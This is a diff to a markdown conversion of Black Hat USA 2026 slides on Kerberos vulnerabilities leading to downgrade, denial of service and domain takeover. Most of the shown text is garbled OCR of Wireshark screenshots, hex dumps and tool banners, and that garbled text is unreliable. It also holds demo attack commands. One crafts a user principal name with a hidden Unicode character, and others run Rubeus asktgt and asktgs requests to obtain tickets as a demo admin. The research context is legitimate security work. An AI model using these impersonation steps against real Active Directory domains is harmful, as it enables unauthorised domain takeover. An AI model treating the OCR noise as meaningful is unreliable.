@@ -22,7 +22,6 @@ converted_at: "2026-08-11T23:16:01Z"
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Shai Laron_Identity Crisis Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover.pdf` (83 pages)
 
-
 ## Slide 1
 
 IDENTITY CRISIS Novel Vulnerabilities Leading to Kerberos Downgrade, DoS, and Full Domain Takeover
@@ -552,7 +551,6 @@ Seemingly normal access
 
 ```text
 &
-A O % = O
 E ame erverAd
 ii Capturing from Ethernet0 2 - Oo x
 File Edit View Go Capture Analyze Statistics Telephony Wireless Tools Help | Ge x i
@@ -586,7 +584,6 @@ SNameString: SERVERA ela
 > enc-part 02 @
 rro---~-- Bee AaAAt la 3
 QO *F  Ethernet0 2: <live capture in progress> Packets: 4325 - Displayed: 38 (0.9%) Profile: Default
-Bm Q Search no we 4
 >
 Search ImportantF Q
 © Preview
@@ -638,7 +635,6 @@ Kerberos ✘ NTLM
 
 ```text
 &
-2 0 % = U
 = ame erverAd
 — ImportantFiles
 a48c® RE Se2=S7FF$LT2baQqanth a
@@ -661,18 +657,10 @@ No. Protocol Info @® new
 232 SMB2 Ioctl Response FSCTL_QUERY_NETWORK_INTERFACE_INFO > GB This ec
 > Hi Network
 > Frame 229: Packet, 158 bytes on wire (12 @@ 5@ 56 9c e1 ed 08 50 56 9c cb
-> Ethernet II, Src: VMware_9c:cb:85 (00:50 08 98 4a fd 40 08 86 06 00 28 cO
 > Internet Protocol Version 4, Src: 192.16 @@ 34 ed 9a @1 bd 1d 8b e8 O2 ce s items
 > Transmission Control Protocol, Src Port:
 >» NetBIOS Session Service
 >» SMB2 (Server Message Block Protocol vers
-@@ fc 82 45 08 88 G8 CB 88 64 fe
-@1 88 88 C8 CG C8 83 BB O1 ECG 18
-08 00 04 88 G6 CB CB CB C8 CO FF
-@@ G2 11 88 88 EB GB 6c EB EO b8
-b7 ed 8e 31 af b3 74 41 86 406 @9
-1c @@ 5c 88 5c 08 53 CB 45 88 52
-52 08 41 08 5c 08 49 8B 50 08 43
 O 7  KerberLoss_downgrade,pcapng Packets: 7321 - Displayed: 39 (0.5%) Profile: Default
 Ht | Q Search
 x +
@@ -786,10 +774,7 @@ ICN=DemoAdmin1, OU=Admin, DC=demo,DC=lab DemoAdmin1 DemoAdmini@demo. lab
 ICN=UPNUser , CN=Users , DC=demo , DC=lab UPNUser Demo Admini@demo.lab
 PS C:\Users\notadmin\Desktop> $upn = “Demo$( [char]: :ConvertFromUtf32([int]"@xE0154") )Admini@demo.lab"
 PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt /user:$upn /password:Password1 /nowrap /suppenctype:AES256 /principaltype: enterprise
-a | |
-—)) Ie _ __
 1 vPtt] -\PL 111 Iz)
-1! \A\L IIE ID) 1 II I 1
 IL} I_l-_/|__/|} ) /(__/
 v2.3.3
 [*] Action: Ask TGT
@@ -858,7 +843,6 @@ USA
 
 ```text
 PS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgt|/user:DemoAdminl /password: Password]
-(oN | |
 —J) Ile _
 f_ vlll tl -W—_ TIT i)
 Ih AMILITIO) ILI Let
@@ -1096,8 +1080,6 @@ SamAccountName UserPrincipalName
 DemoAdmin1
 DemoAdmini@demo. lab
 IPS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgs /ticket:$tgt /service:ldap/dce@1 /nowrap
-(____\ | |
-—)) Jl __ _
 }_ /EIT IT) ~\I_ UII 1 W_)
 11 \\ELIET IL) )—_I LI I |
 II |_I__/|__/I] )__/(__/
